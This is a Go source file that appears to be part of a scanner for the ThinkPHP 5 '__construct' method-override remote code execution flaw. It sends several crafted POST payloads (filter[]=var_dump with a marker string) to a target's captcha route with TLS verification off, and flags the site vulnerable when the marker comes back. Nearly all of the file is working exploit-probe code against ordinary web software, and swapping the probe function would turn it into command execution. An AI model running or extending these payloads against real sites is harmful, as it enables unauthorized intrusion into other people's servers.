package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

//payload: /index.php?s=captcha
//POST: _method=__construct&filter[]=var_dump&method=GET&get[]=tptfb11

var payloads []string

func exec(baseurl string)  {
	flag := exec1(baseurl) //接受返回的payload
	if  flag != "0"{
		fmt.Println(baseurl," [+] vul ! ! !\npayload: ",flag)
	} else {
		fmt.Println(baseurl," [-] not vull tpV5_construct_exec")
	}
}

func exec1(baseurl string) string  {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	payloads := append(payloads, "_method=__construct&method=GET&filter[]=var_dump&get[]=tptfb11","s=tptfb11&_method=__construct&method=POST&filter[]=var_dump","aaaa=tptfb11&_method=__construct&method=GET&filter[]=var_dump","_method=__construct&filter[]=var_dump&method=GET&server[REQUEST_METHOD]=tptfb11")
	for _,payload := range payloads{
		flag := exec2(baseurl,payload)
		if flag != "0"{
			return flag
		}
		url := baseurl + "/public/index.php?s=captcha"
		client := http.Client{
			Transport:     tr,
			CheckRedirect: nil,
			Jar:           nil,
			Timeout:       time.Second*5,
		}
		req, err := http.NewRequest("POST",url,strings.NewReader(payload))
		if err != nil {
			return "0"
		}
		req.Header.Set("User-Agent",user_agent)
		req.Header.Set("Content-Type",content_type)
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("[-] 请求超时，请检查url！ x.x")
			return "0"
		}
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			return "0"
		}
		if (strings.Contains(string(body),"string(7) \"tptfb11\"")) {
			return payload
		} else {
			continue
		}
	}
	return "0"
}

func exec2(baseurl string,payload string) string {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	url := baseurl + "/?s=captcha"
	client := http.Client{
		Transport:     tr,
		CheckRedirect: nil,
		Jar:           nil,
		Timeout:       time.Second*5,
	}
	req, err := http.NewRequest("POST",url,strings.NewReader(payload))
	if err != nil {
		return "0"
	}
	req.Header.Set("Content-Type",content_type)
	req.Header.Set("User-Agent",user_agent)
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("[-] 请求超时，请检查url！ x.x")
		return "0"
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "0"
	}
	if (strings.Contains(string(body),"string(7) \"tptfb11\"")){
		return payload
	} else {
		return "0"
	}
}
